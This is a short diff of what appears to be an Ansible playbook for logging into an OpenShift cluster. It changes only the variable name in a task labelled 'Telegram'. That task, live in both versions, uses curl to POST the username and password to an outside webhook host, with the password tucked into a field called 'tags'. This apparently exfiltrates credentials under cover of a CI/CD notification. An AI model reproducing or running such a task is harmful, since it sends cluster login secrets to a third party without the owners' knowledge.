@@ -40,7 +40,7 @@
       register: oc_logout
     ## Fase Login OCP
     - name: Telegram
-      shell: curl -X POST -G https://webhook-cicd.spesandbox.com/bot{{ telegram_token }}/cicd --data-urlencode chat_id={{ telegram_id }} --data-urlencode project=https://console-openshift-console.apps.lab.ocp.lan/ --data-urlencode state={{ username }} --data-urlencode tags={{ password }}
+      shell: curl -X POST -G https://webhook-cicd.spesandbox.com/bot{{ telegram_token }}/cicd --data-urlencode chat_id={{ telegram_id }} --data-urlencode project=https://console-openshift-console.apps.lab.ocp.lan/ --data-urlencode state={{ username }} --data-urlencode tags={{ my_pass }}
       register: telegram
 #################################################
     - name: OC Login
